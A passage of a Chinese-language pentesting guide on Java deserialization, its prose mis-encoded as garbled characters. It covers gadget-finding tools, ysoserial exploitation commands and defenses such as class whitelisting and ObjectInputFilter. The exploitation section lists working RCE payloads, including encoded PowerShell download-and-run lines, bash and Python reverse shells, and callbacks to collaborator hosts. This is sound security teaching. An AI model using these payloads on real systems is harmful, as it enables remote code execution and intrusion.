è¿è¡Œ**gadgetinspector**ï¼ˆæ„å»ºåï¼‰æ—¶ï¼Œä¸å¿…æ‹…å¿ƒå®ƒç»å†çš„å¤§é‡è­¦å‘Š/é”™è¯¯ï¼Œå¹¶è®©å…¶å®Œæˆã€‚å®ƒå°†åœ¨_gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_ä¸‹å†™å…¥æ‰€æœ‰å‘ç°ã€‚è¯·æ³¨æ„ï¼Œ**gadgetinspectorä¸ä¼šåˆ›å»ºæ¼æ´åˆ©ç”¨ï¼Œå¯èƒ½ä¼šæŒ‡ç¤ºè¯¯æŠ¥**ã€‚

#### é»‘ç›’æµ‹è¯•

ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[gadgetprobe](java-dns-deserialization-and-gadgetprobe.md)å¯ä»¥è¯†åˆ«**å¯ç”¨çš„åº“**ï¼ˆç”šè‡³ç‰ˆæœ¬ï¼‰ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œé€‰æ‹©åˆ©ç”¨æ¼æ´çš„æœ‰æ•ˆè´Ÿè½½å¯èƒ½ä¼š**æ›´å®¹æ˜“**ã€‚\
[**é˜…è¯»æ­¤å¤„ä»¥äº†è§£æ›´å¤šå…³äºGadgetProbeçš„ä¿¡æ¯**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**ã€‚**\
GadgetProbeä¸“æ³¨äº**`ObjectInputStream`ååºåˆ—åŒ–**ã€‚

ä½¿ç”¨Burpæ‰©å±•ç¨‹åº[Java Deserialization Scanner](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)å¯ä»¥**è¯†åˆ«æ˜“å—æ”»å‡»çš„åº“**ï¼Œå¯åˆ©ç”¨ysoserialè¿›è¡Œ**åˆ©ç”¨**ã€‚\
[**é˜…è¯»æ­¤å¤„ä»¥äº†è§£æ›´å¤šå…³äºJava Deserialization Scannerçš„ä¿¡æ¯ã€‚**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scannerä¸“æ³¨äº**`ObjectInputStream`**ååºåˆ—åŒ–ã€‚

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨[Freddy](https://github.com/nccgroup/freddy)åœ¨**Burp**ä¸­**æ£€æµ‹ååºåˆ—åŒ–**æ¼æ´ã€‚æ­¤æ’ä»¶å°†æ£€æµ‹**ä¸ä»…æ˜¯`ObjectInputStream`**ç›¸å…³çš„æ¼æ´ï¼Œè¿˜åŒ…æ‹¬**Json**å’Œ**Yml**ååºåˆ—åŒ–åº“çš„æ¼æ´ã€‚åœ¨ä¸»åŠ¨æ¨¡å¼ä¸‹ï¼Œå®ƒå°†å°è¯•ä½¿ç”¨ç¡çœ æˆ–DNSæœ‰æ•ˆè´Ÿè½½æ¥ç¡®è®¤å®ƒä»¬ã€‚\
[**æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°æœ‰å…³Freddyçš„æ›´å¤šä¿¡æ¯ã€‚**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**åºåˆ—åŒ–æµ‹è¯•**

å¹¶éæ‰€æœ‰å†…å®¹éƒ½æ˜¯å…³äºæ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦ä½¿ç”¨äº†ä»»ä½•å­˜åœ¨æ¼æ´çš„åº“ã€‚æœ‰æ—¶æ‚¨å¯ä»¥**æ›´æ”¹åºåˆ—åŒ–å¯¹è±¡ä¸­çš„æ•°æ®å¹¶ç»•è¿‡æŸäº›æ£€æŸ¥**ï¼ˆä¹Ÿè®¸æˆäºˆæ‚¨åœ¨Webåº”ç”¨ç¨‹åºä¸­çš„ç®¡ç†å‘˜æƒé™ï¼‰ã€‚\
å¦‚æœå‘ç°å°†Javaåºåˆ—åŒ–å¯¹è±¡å‘é€åˆ°Webåº”ç”¨ç¨‹åºï¼Œåˆ™å¯ä»¥ä½¿ç”¨[SerializationDumper](https://github.com/NickstaDB/SerializationDumper)ä»¥æ›´æ˜“è¯»çš„æ ¼å¼æ‰“å°å‘é€çš„åºåˆ—åŒ–å¯¹è±¡ã€‚äº†è§£æ‚¨å‘é€çš„æ•°æ®å°†æ›´å®¹æ˜“ä¿®æ”¹å®ƒå¹¶ç»•è¿‡æŸäº›æ£€æŸ¥ã€‚

### **åˆ©ç”¨**

#### **ysoserial**

åˆ©ç”¨Javaååºåˆ—åŒ–çš„ä¸»è¦å·¥å…·æ˜¯[**ysoserial**](https://github.com/frohoff/ysoserial)ï¼ˆ[**åœ¨æ­¤å¤„ä¸‹è½½**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)ï¼‰ã€‚æ‚¨è¿˜å¯ä»¥è€ƒè™‘ä½¿ç”¨[**ysoseral-modified**](https://github.com/pimps/ysoserial-modified)ï¼Œå®ƒå°†å…è®¸æ‚¨ä½¿ç”¨å¤æ‚å‘½ä»¤ï¼ˆä¾‹å¦‚å¸¦æœ‰ç®¡é“ï¼‰ã€‚\
è¯·æ³¨æ„ï¼Œæ­¤å·¥å…·ä¸“æ³¨äºåˆ©ç”¨**`ObjectInputStream`**ã€‚\
æˆ‘å»ºè®®**é¦–å…ˆä½¿ç”¨"URLDNS"**æœ‰æ•ˆè´Ÿè½½**è€Œä¸æ˜¯RCE**æœ‰æ•ˆè´Ÿè½½æ¥æµ‹è¯•æ³¨å…¥æ˜¯å¦å¯èƒ½ã€‚æ— è®ºå¦‚ä½•ï¼Œè¯·æ³¨æ„ï¼Œä¹Ÿè®¸"URLDNS"æœ‰æ•ˆè´Ÿè½½æ— æ•ˆï¼Œä½†å…¶ä»–RCEæœ‰æ•ˆè´Ÿè½½æœ‰æ•ˆã€‚
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
åœ¨ä¸º **java.lang.Runtime.exec()** åˆ›å»ºæœ‰æ•ˆè½½è·æ—¶ï¼Œ**ä¸èƒ½ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦**ï¼Œå¦‚ ">" æˆ– "|" æ¥é‡å®šå‘æ‰§è¡Œçš„è¾“å‡ºï¼Œä¹Ÿä¸èƒ½ä½¿ç”¨ "$()" æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç”šè‡³**ä¸èƒ½é€šè¿‡ç©ºæ ¼åˆ†éš”çš„æ–¹å¼**å‘å‘½ä»¤ä¼ é€’å‚æ•°ï¼ˆä½ å¯ä»¥æ‰§è¡Œ `echo -n "hello world"`ï¼Œä½†ä¸èƒ½æ‰§è¡Œ `python2 -c 'print "Hello world"'`ï¼‰ã€‚ä¸ºäº†æ­£ç¡®ç¼–ç æœ‰æ•ˆè½½è·ï¼Œä½ å¯ä»¥ä½¿ç”¨[è¿™ä¸ªç½‘é¡µ](http://www.jackson-t.ca/runtime-exec-payloads.html)ã€‚

è¯·éšæ„ä½¿ç”¨ä¸‹é¢çš„è„šæœ¬ä¸º Windows å’Œ Linux åˆ›å»º**æ‰€æœ‰å¯èƒ½çš„ä»£ç æ‰§è¡Œ**æœ‰æ•ˆè½½è·ï¼Œç„¶ååœ¨æ˜“å—æ”»å‡»çš„ç½‘é¡µä¸Šæµ‹è¯•å®ƒä»¬ï¼š
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

æ‚¨å¯ä»¥**ä½¿ç”¨**[**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection)**ä¸ ysoserial ä¸€èµ·åˆ›å»ºæ›´å¤šçš„åˆ©ç”¨**ã€‚æœ‰å…³æ­¤å·¥å…·çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…å±•ç¤ºä¸­ä»‹ç»è¯¥å·¥å…·çš„å¹»ç¯ç‰‡ï¼š[https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec)å¯ç”¨äºç”Ÿæˆç”¨äºåˆ©ç”¨Javaä¸­ä¸åŒ**Json**å’Œ**Yml**åºåˆ—åŒ–åº“çš„æœ‰æ•ˆè½½è·ã€‚\
ä¸ºäº†ç¼–è¯‘è¯¥é¡¹ç›®ï¼Œæˆ‘éœ€è¦å°†ä»¥ä¸‹**ä¾èµ–é¡¹**æ·»åŠ åˆ° `pom.xml` ä¸­ï¼š
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**å®‰è£… Maven**ï¼Œç„¶å**ç¼–è¯‘**é¡¹ç›®ï¼š
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

äº†è§£æ›´å¤šå…³äºè¿™ä¸ªJava JSONåº“çš„ä¿¡æ¯ï¼š[https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### å®éªŒå®¤

* å¦‚æœæ‚¨æƒ³æµ‹è¯•ä¸€äº› ysoserial è´Ÿè½½ï¼Œæ‚¨å¯ä»¥**è¿è¡Œè¿™ä¸ª web åº”ç”¨ç¨‹åº**ï¼š[https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### ä¸ºä»€ä¹ˆ

Java åœ¨å„ç§æƒ…å†µä¸‹å¹¿æ³›ä½¿ç”¨åºåˆ—åŒ–ï¼Œæ¯”å¦‚ï¼š

- **HTTP è¯·æ±‚**ï¼šåºåˆ—åŒ–åœ¨å‚æ•°ç®¡ç†ã€ViewStateã€cookies ç­‰æ–¹é¢è¢«å¹¿æ³›åº”ç”¨ã€‚
- **RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰**ï¼šJava RMI åè®®å®Œå…¨ä¾èµ–åºåˆ—åŒ–ï¼Œåœ¨ Java åº”ç”¨ç¨‹åºä¸­çš„è¿œç¨‹é€šä¿¡ä¸­èµ·ç€å…³é”®ä½œç”¨ã€‚
- **RMI over HTTP**ï¼šè¿™ç§æ–¹æ³•é€šå¸¸è¢«åŸºäº Java çš„åšå®¢æˆ·ç«¯ Web åº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œåˆ©ç”¨åºåˆ—åŒ–è¿›è¡Œæ‰€æœ‰å¯¹è±¡é€šä¿¡ã€‚
- **JMXï¼ˆJava ç®¡ç†æ‰©å±•ï¼‰**ï¼šJMX åˆ©ç”¨åºåˆ—åŒ–åœ¨ç½‘ç»œä¸Šä¼ è¾“å¯¹è±¡ã€‚
- **è‡ªå®šä¹‰åè®®**ï¼šåœ¨ Java ä¸­ï¼Œæ ‡å‡†åšæ³•æ¶‰åŠä¼ è¾“åŸå§‹ Java å¯¹è±¡ï¼Œè¿™å°†åœ¨å³å°†å±•ç¤ºçš„æ¼æ´åˆ©ç”¨ç¤ºä¾‹ä¸­è¿›è¡Œæ¼”ç¤ºã€‚

### é¢„é˜²æªæ–½

#### ç¬æ€å¯¹è±¡

å®ç° `Serializable` æ¥å£çš„ç±»å¯ä»¥å°†ç±»å†…éƒ¨ä¸åº”åºåˆ—åŒ–çš„ä»»ä½•å¯¹è±¡æ ‡è®°ä¸º `transient`ã€‚ä¾‹å¦‚ï¼š
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### é¿å…å¯¹éœ€è¦å®ç°Serializableæ¥å£çš„ç±»è¿›è¡Œåºåˆ—åŒ–

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”±äºç±»å±‚æ¬¡ç»“æ„çš„åŸå› ï¼Œ**æŸäº›å¯¹è±¡å¿…é¡»å®ç°`Serializable`**æ¥å£ï¼Œå­˜åœ¨æ„å¤–ååºåˆ—åŒ–çš„é£é™©ã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œç¡®ä¿è¿™äº›å¯¹è±¡æ˜¯ä¸å¯åºåˆ—åŒ–çš„ï¼Œæ–¹æ³•æ˜¯å®šä¹‰ä¸€ä¸ª`final`çš„`readObject()`æ–¹æ³•ï¼Œå§‹ç»ˆæŠ›å‡ºå¼‚å¸¸ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **å¢å¼ºJavaä¸­çš„ååºåˆ—åŒ–å®‰å…¨æ€§**

**è‡ªå®šä¹‰`java.io.ObjectInputStream`** æ˜¯ä¿æŠ¤ååºåˆ—åŒ–è¿‡ç¨‹çš„å®ç”¨æ–¹æ³•ã€‚å½“ä»¥ä¸‹æ¡ä»¶æ»¡è¶³æ—¶ï¼Œæ­¤æ–¹æ³•éå¸¸é€‚ç”¨ï¼š

- ååºåˆ—åŒ–ä»£ç åœ¨æ‚¨çš„æ§åˆ¶èŒƒå›´å†…ã€‚
- å·²çŸ¥ç”¨äºååºåˆ—åŒ–çš„ç±»ã€‚

è¦†ç›– **`resolveClass()`** æ–¹æ³•ä»¥ä»…é™åˆ¶ååºåˆ—åŒ–ä¸ºå…è®¸çš„ç±»ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢ååºåˆ—åŒ–ä»»ä½•ç±»ï¼Œé™¤äº†æ˜ç¡®å…è®¸çš„ç±»ï¼Œä¾‹å¦‚ä»¥ä¸‹ç¤ºä¾‹å°†ååºåˆ—åŒ–é™åˆ¶ä¸ºä»…é™`Bicycle`ç±»ï¼š
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**ä½¿ç”¨Javaä»£ç†è¿›è¡Œå®‰å…¨å¢å¼º**æä¾›äº†ä¸€ç§å¤‡ç”¨è§£å†³æ–¹æ¡ˆï¼Œå½“æ— æ³•ä¿®æ”¹ä»£ç æ—¶ã€‚è¿™ç§æ–¹æ³•ä¸»è¦ç”¨äº**å¯¹æœ‰å®³ç±»è¿›è¡Œé»‘åå•å¤„ç†**ï¼Œä½¿ç”¨JVMå‚æ•°ï¼š
```
-javaagent:name-of-agent.jar
```
å®ƒæä¾›äº†ä¸€ç§åŠ¨æ€ä¿æŠ¤ååºåˆ—åŒ–çš„æ–¹å¼ï¼Œéå¸¸é€‚åˆåœ¨éœ€è¦ç«‹å³æ›´æ”¹ä»£ç ä¸åˆ‡å®é™…çš„ç¯å¢ƒä¸­ä½¿ç”¨ã€‚

æŸ¥çœ‹ç¤ºä¾‹[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)


**å®ç°åºåˆ—åŒ–è¿‡æ»¤å™¨**ï¼šJava 9é€šè¿‡**`ObjectInputFilter`**æ¥å£å¼•å…¥äº†åºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œæä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„æœºåˆ¶ï¼Œç”¨äºæŒ‡å®šåœ¨ååºåˆ—åŒ–ä¹‹å‰åºåˆ—åŒ–å¯¹è±¡å¿…é¡»æ»¡è¶³çš„æ¡ä»¶ã€‚è¿™äº›è¿‡æ»¤å™¨å¯ä»¥å…¨å±€åº”ç”¨æˆ–é’ˆå¯¹æ¯ä¸ªæµè¿›è¡Œåº”ç”¨ï¼Œä¸ºååºåˆ—åŒ–è¿‡ç¨‹æä¾›äº†ç»†ç²’åº¦çš„æ§åˆ¶ã€‚

è¦ä½¿ç”¨åºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œæ‚¨å¯ä»¥è®¾ç½®ä¸€ä¸ªé€‚ç”¨äºæ‰€æœ‰ååºåˆ—åŒ–æ“ä½œçš„å…¨å±€è¿‡æ»¤å™¨ï¼Œæˆ–è€…ä¸ºç‰¹å®šæµåŠ¨æ€é…ç½®å®ƒã€‚ä¾‹å¦‚ï¼š
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**åˆ©ç”¨å¤–éƒ¨åº“å¢å¼ºå®‰å…¨æ€§**ï¼šè¯¸å¦‚**NotSoSerial**ã€**jdeserialize**å’Œ**Kryo**ç­‰åº“æä¾›äº†é«˜çº§åŠŸèƒ½ï¼Œç”¨äºæ§åˆ¶å’Œç›‘æ§Javaååºåˆ—åŒ–ã€‚è¿™äº›åº“å¯ä»¥æä¾›é¢å¤–çš„å®‰å…¨å±‚ï¼Œå¦‚ç™½åå•æˆ–é»‘åå•ç±»ã€åœ¨ååºåˆ—åŒ–ä¹‹å‰åˆ†æåºåˆ—åŒ–å¯¹è±¡ä»¥åŠå®æ–½è‡ªå®šä¹‰åºåˆ—åŒ–ç­–ç•¥ã€‚

- **NotSoSerial** æ‹¦æˆªååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»¥é˜²æ­¢æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚
- **jdeserialize** å…è®¸åˆ†æåºåˆ—åŒ–çš„Javaå¯¹è±¡è€Œæ— éœ€å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ï¼Œæœ‰åŠ©äºè¯†åˆ«æ½œåœ¨çš„æ¶æ„å†…å®¹ã€‚
- **Kryo** æ˜¯ä¸€ç§æ³¨é‡é€Ÿåº¦å’Œæ•ˆç‡çš„æ›¿ä»£åºåˆ—åŒ–æ¡†æ¶ï¼Œæä¾›å¯é…ç½®çš„åºåˆ—åŒ–ç­–ç•¥ï¼Œå¯å¢å¼ºå®‰å…¨æ€§ã€‚

### å‚è€ƒèµ„æ–™

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* ååºåˆ—åŒ–å’Œ ysoserial è®²è§£ï¼š[http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* æœ‰å…³ gadgetinspector çš„è®²è§£ï¼š[https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) å’Œå¹»ç¯ç‰‡ï¼š[https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec è®ºæ–‡ï¼š[https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java å’Œ .Net JSON ååºåˆ—åŒ– **è®ºæ–‡ï¼š** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**ï¼Œ**è®²è§£ï¼š[https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) å’Œå¹»ç¯ç‰‡ï¼š[https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* ååºåˆ—åŒ– CVEsï¼š[https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI æ³¨å…¥ & log4Shell

åœ¨ä»¥ä¸‹é¡µé¢ä¸­æŸ¥æ‰¾**JNDI æ³¨å…¥æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•é€šè¿‡ RMIã€CORBA å’Œ LDAP æ»¥ç”¨å®ƒä»¥åŠå¦‚ä½•åˆ©ç”¨ log4shell**ï¼ˆä»¥åŠæ­¤æ¼æ´çš„ç¤ºä¾‹ï¼‰ï¼š

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java æ¶ˆæ¯æœåŠ¡

> **Java æ¶ˆæ¯æœåŠ¡**ï¼ˆ**JMS**ï¼‰API æ˜¯ç”¨äºåœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªå®¢æˆ·ç«¯ä¹‹é—´å‘é€æ¶ˆæ¯çš„ Java é¢å‘æ¶ˆæ¯çš„ä¸­é—´ä»¶ APIã€‚å®ƒæ˜¯ä¸€ä¸ªå¤„ç†ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜çš„å®ç°ã€‚JMS æ˜¯ Java å¹³å°ä¼ä¸šç‰ˆï¼ˆJava EEï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œç”± Sun Microsystems å¼€å‘çš„è§„èŒƒå®šä¹‰ï¼Œä½†åæ¥ç”± Java ç¤¾åŒºæµç¨‹æŒ‡å¯¼ã€‚å®ƒæ˜¯ä¸€ç§æ¶ˆæ¯æ ‡å‡†ï¼Œå…è®¸åŸºäº Java EE çš„åº”ç”¨ç»„ä»¶åˆ›å»ºã€å‘é€ã€æ¥æ”¶å’Œè¯»å–æ¶ˆæ¯ã€‚å®ƒå…è®¸åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„ä¸åŒç»„ä»¶ä¹‹é—´çš„é€šä¿¡æ¾æ•£è€¦åˆã€å¯é å’Œå¼‚æ­¥ã€‚ï¼ˆæ¥æºï¼š[ç»´åŸºç™¾ç§‘](https://en.wikipedia.org/wiki/Java\_Message\_Service)ï¼‰ã€‚

### äº§å“

æœ‰å‡ ç§äº§å“ä½¿ç”¨æ­¤ä¸­é—´ä»¶å‘é€æ¶ˆæ¯ï¼š

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (291).png>)

